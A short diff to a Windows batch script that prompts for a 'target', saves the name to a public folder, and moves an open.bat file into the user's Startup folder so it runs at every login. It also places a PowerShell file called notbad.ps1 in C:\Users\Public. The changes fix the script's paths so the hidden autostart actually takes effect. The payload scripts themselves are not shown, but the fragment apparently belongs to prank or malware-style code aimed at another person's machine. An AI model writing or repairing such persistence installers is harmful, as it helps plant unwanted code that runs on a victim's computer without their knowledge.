@@ -8,7 +8,7 @@
 color 2
 
 set /p Target=Who is the target?
-echo Target>C:\Users\Public\target.txt
+echo %Target%>C:\Users\Public\target.txt
 
-move open.bat C:\%USERNAME%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\open.bat
-move notbad.bat C:\Users\Public\notbad.bat
+move open.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat"
+move notbad.ps1 C:\Users\Public\notbad.ps1
